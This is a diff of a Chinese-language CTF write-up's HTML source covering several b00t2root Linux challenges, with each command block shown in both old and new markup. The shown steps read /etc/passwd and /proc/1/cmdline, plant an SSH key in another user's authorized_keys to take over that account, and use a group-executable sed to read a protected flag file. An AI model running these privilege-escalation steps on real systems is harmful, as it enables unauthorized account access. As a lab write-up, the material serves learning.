-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">     -A      Display information about other users&apos; processes, including those without controlling terminals.</span><br><span class="line">...</span><br><span class="line">     -e      Identical to -A.</span><br><span class="line"></span><br><span class="line">     -f      Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso-</span><br><span class="line">             ciated command.  If the -u option is also used, display the user name rather then the numeric uid.  When -o or -O is used</span><br><span class="line">             to add to the display following -f, the command field is not truncated as severely as it is in other formats.</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>也就是显示<code>uid</code>、<code>pid</code>、<code>ppid</code>等相关信息，然后看看输出：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steve@d18fb074a417:~$ ps -ef</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root         1     0  0 09:52 pts/0    00:00:00 bash /tmp/42.sh b00t2root&#123;Cmd_l1</span><br><span class="line">root        14     1  0 09:52 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root        16     1  0 09:52 pts/0    00:00:00 su -l steve</span><br><span class="line">steve       18    16  0 09:52 pts/0    00:00:00 -su</span><br><span class="line">steve       27    18  0 09:56 pts/0    00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
-<p>我们在 pid 为 1 的进程中看到了<code>bash /tmp/42.sh b00t2root{Cmd_l1</code>，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在<code>/proc/1/</code>下找到一个文件<code>cmdline</code>，flag 就在里面：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">steve@d18fb074a417:~$ ls /proc/1/</span><br><span class="line">ls: cannot <span class="built_in">read</span> symbolic link <span class="string">'/proc/1/cwd'</span>: Permission denied</span><br><span class="line">ls: cannot <span class="built_in">read</span> symbolic link <span class="string">'/proc/1/root'</span>: Permission denied</span><br><span class="line">ls: cannot <span class="built_in">read</span> symbolic link <span class="string">'/proc/1/exe'</span>: Permission denied</span><br><span class="line">attr             exe        mounts         projid_map    status</span><br><span class="line">autogroup        fd         mountstats     root          syscall</span><br><span class="line">auxv             fdinfo     net            <span class="built_in">sched</span>         task</span><br><span class="line">cgroup           gid_map    ns             schedstat     timers</span><br><span class="line">clear_refs       io         numa_maps      sessionid     timerslack_ns</span><br><span class="line">cmdline          limits     oom_adj        setgroups     uid_map</span><br><span class="line">comm             loginuid   oom_score      smaps         wchan</span><br><span class="line">coredump_filter  map_files  oom_score_adj  smaps_rollup</span><br><span class="line">cpuset           maps       pagemap        stack</span><br><span class="line">cwd              mem        patch_state    <span class="built_in">stat</span></span><br><span class="line">environ          mountinfo  personality    statm</span><br><span class="line">steve@d18fb074a417:~$ cat /proc/1/cmdline</span><br><span class="line">bash/tmp/42.shb00t2root&#123;Cmd_l1n3_fl4g5_4r3_0bv10u5&#125;steve@d18fb074a417:/home/tony$</span><br></pre></td></tr></table></figure>
+<p>给了一个 socat 的脚本，连上去以后是一个 docker。看了一下 <code>steve</code> 家目录下没有什么东西，隐藏文件也是一些没用的像是 <code>.bashrc</code> 还有 <code>.profile</code> 之类的文件。可以先试试 <code>cat /etc/passwd</code> 能不能用，看看服务器上有哪些用户：</p>
+<pre><code class="bash">steve@d18fb074a417:~$ ls
+steve@d18fb074a417:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+steve:x:1000:1000:,,,:/home/steve:/bin/bash
+tony:x:1001:0:,,,:/home/tony:/bin/bash
+</code></pre>
+<p>可以看到除了一开始的 <code>root</code>，最下面还有 <code>steve</code> 和 <code>tony</code>两个用户，上面还有一个 <code>sshd</code>，说明服务器上起了 ssh。这里推荐一个关于 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">Linux 提权基础（Basic Linux Privilege Escalation）</a>的网站，上面提供了很多可以提权的小命令。我们先用 <code>ps aux</code> 做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务：</p>
+<pre><code class="bash">steve@d18fb074a417:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0  18376  3108 pts/0    Ss   09:52   0:00 bash /tmp/42.sh
+root        14  0.0  0.0  72296  3408 ?        Ss   09:52   0:00 /usr/sbin/sshd
+root        16  0.0  0.0  55952  3344 pts/0    S    09:52   0:00 su -l steve
+steve       18  0.0  0.0  18508  3444 pts/0    S    09:52   0:00 -su
+steve       25  0.0  0.0  34400  3028 pts/0    R+   09:55   0:00 ps aux
+steve@d18fb074a417:~$ cat /tmp/42.sh
+cat: /tmp/42.sh: No such file or directory
+</code></pre>
+<p>可以看到一个 <code>bash /tmp/42.sh</code> 很引人注目，但是试图打开它的时候失败了。再试试 <code>ps -ef</code>，<code>man</code> 一下看看这两个参数：</p>
+<pre><code>...
+     -A      Display information about other users&#39; processes, including those without controlling terminals.
+...
+     -e      Identical to -A.
+
+     -f      Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso-
+             ciated command.  If the -u option is also used, display the user name rather then the numeric uid.  When -o or -O is used
+             to add to the display following -f, the command field is not truncated as severely as it is in other formats.
+...
+</code></pre><p>也就是显示 <code>uid</code>、<code>pid</code>、<code>ppid</code> 等相关信息，然后看看输出：</p>
+<pre><code class="bash">steve@d18fb074a417:~$ ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 09:52 pts/0    00:00:00 bash /tmp/42.sh b00t2root{Cmd_l1
+root        14     1  0 09:52 ?        00:00:00 /usr/sbin/sshd
+root        16     1  0 09:52 pts/0    00:00:00 su -l steve
+steve       18    16  0 09:52 pts/0    00:00:00 -su
+steve       27    18  0 09:56 pts/0    00:00:00 ps -ef
+</code></pre>
+<p>我们在 pid 为 1 的进程中看到了 <code>bash /tmp/42.sh b00t2root{Cmd_l1</code>，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在 <code>/proc/1/</code> 下找到一个文件 <code>cmdline</code>，flag 就在里面：</p>
+<pre><code class="bash">steve@d18fb074a417:~$ ls /proc/1/
+ls: cannot read symbolic link &#39;/proc/1/cwd&#39;: Permission denied
+ls: cannot read symbolic link &#39;/proc/1/root&#39;: Permission denied
+ls: cannot read symbolic link &#39;/proc/1/exe&#39;: Permission denied
+attr             exe        mounts         projid_map    status
+autogroup        fd         mountstats     root          syscall
+auxv             fdinfo     net            sched         task
+cgroup           gid_map    ns             schedstat     timers
+clear_refs       io         numa_maps      sessionid     timerslack_ns
+cmdline          limits     oom_adj        setgroups     uid_map
+comm             loginuid   oom_score      smaps         wchan
+coredump_filter  map_files  oom_score_adj  smaps_rollup
+cpuset           maps       pagemap        stack
+cwd              mem        patch_state    stat
+environ          mountinfo  personality    statm
+steve@d18fb074a417:~$ cat /proc/1/cmdline
+bash/tmp/42.shb00t2root{Cmd_l1n3_fl4g5_4r3_0bv10u5}steve@d18fb074a417:/home/tony$
+</code></pre>
 <h2 id="Tony-Stank"><a href="#Tony-Stank" class="headerlink" title="Tony Stank"></a>Tony Stank</h2><p>Professor Hulk requires a flag hidden in <code>tony</code>‘s account to wield the infinity gauntlet. Retrieve it for him by any means necessary.</p>
 <p>我们在上一道题目中发现服务器是开了 ssh 的，在这道题会派上很大的用场。我们尝试进到 tony 的家目录：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steve@e2797a47d8f5:~$ <span class="built_in">cd</span> /home/tony</span><br><span class="line">steve@e2797a47d8f5:/home/tony$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .</span><br><span class="line">drwxr-x--x 1 root root 4096 Mar 29 15:30 ..</span><br><span class="line">-rw-r--r-- 1 tony root  220 Mar 29 15:30 .bash_logout</span><br><span class="line">-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc</span><br><span class="line">---------- 1 tony root   38 Mar 29 15:28 .flag</span><br><span class="line">-rw-r--r-- 1 tony root  807 Mar 29 15:30 .profile</span><br><span class="line">steve@e2797a47d8f5:/home/tony$ touch anything</span><br><span class="line">steve@e2797a47d8f5:/home/tony$ ls</span><br><span class="line">anything</span><br></pre></td></tr></table></figure>
-<p>看到了一个<code>.flag</code>文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到<code>/home/tony/.ssh/authorized_keys</code>中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">steve@e2797a47d8f5:/home/tony$ mkdir .ssh</span><br><span class="line">steve@e2797a47d8f5:/home/tony$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/steve/.ssh/id_rsa):</span><br><span class="line">Created directory <span class="string">'/home/steve/.ssh'</span>.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/steve/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/steve/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|o .              |</span></span><br><span class="line"><span class="string">|.* o             |</span></span><br><span class="line"><span class="string">|o %              |</span></span><br><span class="line"><span class="string">|oO .             |</span></span><br><span class="line"><span class="string">|o.*     S        |</span></span><br><span class="line"><span class="string">|+= O   + =       |</span></span><br><span class="line"><span class="string">|E+Xoo o B .      |</span></span><br><span class="line"><span class="string">| o++ = + +       |</span></span><br><span class="line"><span class="string">|.oo.+ o.. ++.    |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">steve@e2797a47d8f5:/home/tony$ ls ~/.ssh</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub</span></span><br><span class="line"><span class="string">steve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub &gt;.ssh/authorized_keys</span></span><br><span class="line"><span class="string">steve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keys</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5</span></span><br><span class="line"><span class="string">steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhost</span></span><br><span class="line"><span class="string">The authenticity of host '</span>localhost (127.0.0.1)<span class="string">' can'</span>t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span> connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added <span class="string">'localhost'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">'unminimize'</span> <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">tony@e2797a47d8f5:~$ id</span><br><span class="line">uid=1001(tony) gid=0(root) groups=0(root)</span><br><span class="line">tony@e2797a47d8f5:~$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxrwxrwx 1 tony  root  4096 Mar 31 11:38 .</span><br><span class="line">drwxr-x--x 1 root  root  4096 Mar 29 15:30 ..</span><br><span class="line">-rw-r--r-- 1 tony  root   220 Mar 29 15:30 .bash_logout</span><br><span class="line">-rw-r--r-- 1 tony  root  3771 Mar 29 15:30 .bashrc</span><br><span class="line">drwx------ 2 tony  root  4096 Mar 31 11:38 .cache</span><br><span class="line">---------- 1 tony  root    38 Mar 29 15:28 .flag</span><br><span class="line">-rw-r--r-- 1 tony  root   807 Mar 29 15:30 .profile</span><br><span class="line">drwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh</span><br><span class="line">-rw-rw-r-- 1 steve steve    0 Mar 31 11:34 anything</span><br><span class="line">tony@e2797a47d8f5:~$ cat .flag</span><br><span class="line">cat: .flag: Permission denied</span><br></pre></td></tr></table></figure>
-<p>变成 tony 后，发现依然无法查看，因为无论是哪个用户，对<code>.flag</code>文件没有任何权限。我们尝试进行<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">提权</a>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tony@e2797a47d8f5:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/sed</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">steve@e2797a47d8f5:~$ cd /home/tony
+steve@e2797a47d8f5:/home/tony$ ls -la
+total 24
+drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .
+drwxr-x--x 1 root root 4096 Mar 29 15:30 ..
+-rw-r--r-- 1 tony root  220 Mar 29 15:30 .bash_logout
+-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc
+---------- 1 tony root   38 Mar 29 15:28 .flag
+-rw-r--r-- 1 tony root  807 Mar 29 15:30 .profile
+steve@e2797a47d8f5:/home/tony$ touch anything
+steve@e2797a47d8f5:/home/tony$ ls
+anything
+</code></pre>
+<p>看到了一个 <code>.flag</code> 文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到 <code>/home/tony/.ssh/authorized_keys</code> 中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony：</p>
+<pre><code class="bash">steve@e2797a47d8f5:/home/tony$ mkdir .ssh
+steve@e2797a47d8f5:/home/tony$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/steve/.ssh/id_rsa):
+Created directory &#39;/home/steve/.ssh&#39;.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/steve/.ssh/id_rsa.
+Your public key has been saved in /home/steve/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5
+The key&#39;s randomart image is:
++---[RSA 2048]----+
+|o .              |
+|.* o             |
+|o %              |
+|oO .             |
+|o.*     S        |
+|+= O   + =       |
+|E+Xoo o B .      |
+| o++ = + +       |
+|.oo.+ o.. ++.    |
++----[SHA256]-----+
+steve@e2797a47d8f5:/home/tony$ ls ~/.ssh
+id_rsa  id_rsa.pub
+steve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub &gt;.ssh/authorized_keys
+steve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5
+steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhost
+The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;localhost&#39; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#39;unminimize&#39; command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+tony@e2797a47d8f5:~$ id
+uid=1001(tony) gid=0(root) groups=0(root)
+tony@e2797a47d8f5:~$ ls -al
+total 36
+drwxrwxrwx 1 tony  root  4096 Mar 31 11:38 .
+drwxr-x--x 1 root  root  4096 Mar 29 15:30 ..
+-rw-r--r-- 1 tony  root   220 Mar 29 15:30 .bash_logout
+-rw-r--r-- 1 tony  root  3771 Mar 29 15:30 .bashrc
+drwx------ 2 tony  root  4096 Mar 31 11:38 .cache
+---------- 1 tony  root    38 Mar 29 15:28 .flag
+-rw-r--r-- 1 tony  root   807 Mar 29 15:30 .profile
+drwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh
+-rw-rw-r-- 1 steve steve    0 Mar 31 11:34 anything
+tony@e2797a47d8f5:~$ cat .flag
+cat: .flag: Permission denied
+</code></pre>
+<p>变成 tony 后，发现依然无法查看，因为无论是哪个用户，对 <code>.flag</code> 文件没有任何权限。我们尝试进行<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">提权</a>：</p>
+<pre><code class="bash">tony@e2797a47d8f5:~$ find / -perm -u=s -type f 2&gt;/dev/null
+/bin/sed
+/bin/mount
+/bin/umount
+/bin/su
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+</code></pre>
 <blockquote>
 <p>注：在类 Unix 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，读取它则会立即得到一个 EOF。 在程序员行话，尤其是 Unix 行话中，/dev/null 被称为比特桶或者黑洞。</p>
 </blockquote>
-<p>查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些<a href="https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix" target="_blank" rel="noopener">SUID 的知识</a>。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steve@d18fb074a417:~$ ls -l /bin/sed</span><br><span class="line">-rwxrwx--- 1 root  root  109000 Jan 30 2018 /bin/sed</span><br><span class="line">steve@d18fb074a417:~$ /bin/sed</span><br><span class="line">-su: /bin/sed: Permission denied</span><br><span class="line">tony@e2797a47d8f5:~$ id</span><br><span class="line">uid=1001(tony) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
-<p>我们发现 steve 是无法执行<code>/bin/sed</code>的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下<a href="https://gtfobins.github.io/gtfobins/sed/#file-read" target="_blank" rel="noopener">如何通过 sed 查看文件</a>（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tony@e2797a47d8f5:~$ /bin/sed <span class="string">''</span> .flag</span><br><span class="line">b00t2root&#123;1_h0p3_ssh_15_th3_0nly_w4y&#125;</span><br></pre></td></tr></table></figure>
+<p>查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些 <a href="https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix" target="_blank" rel="noopener">SUID 的知识</a>。</p>
+<pre><code class="bash">steve@d18fb074a417:~$ ls -l /bin/sed
+-rwxrwx--- 1 root  root  109000 Jan 30 2018 /bin/sed
+steve@d18fb074a417:~$ /bin/sed
+-su: /bin/sed: Permission denied
+tony@e2797a47d8f5:~$ id
+uid=1001(tony) gid=0(root) groups=0(root)
+</code></pre>
+<p>我们发现 steve 是无法执行 <code>/bin/sed</code> 的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下<a href="https://gtfobins.github.io/gtfobins/sed/#file-read" target="_blank" rel="noopener">如何通过 sed 查看文件</a>（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag：</p>
+<pre><code class="bash">tony@e2797a47d8f5:~$ /bin/sed &#39;&#39; .flag
+b00t2root{1_h0p3_ssh_15_th3_0nly_w4y}
+</code></pre>
 <h2 id="Groot"><a href="#Groot" class="headerlink" title="Groot"></a>Groot</h2><p>We know Groot’s no more but we can still hear him in the environment. Can you?</p>
 <p>根据提示可以知道 flag 基本上是在环境变量里：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tony@e2797a47d8f5:~$ env</span><br><span class="line">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:<span class="keyword">do</span>=01;35:bd=40;33;01:<span class="built_in">cd</span>=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35: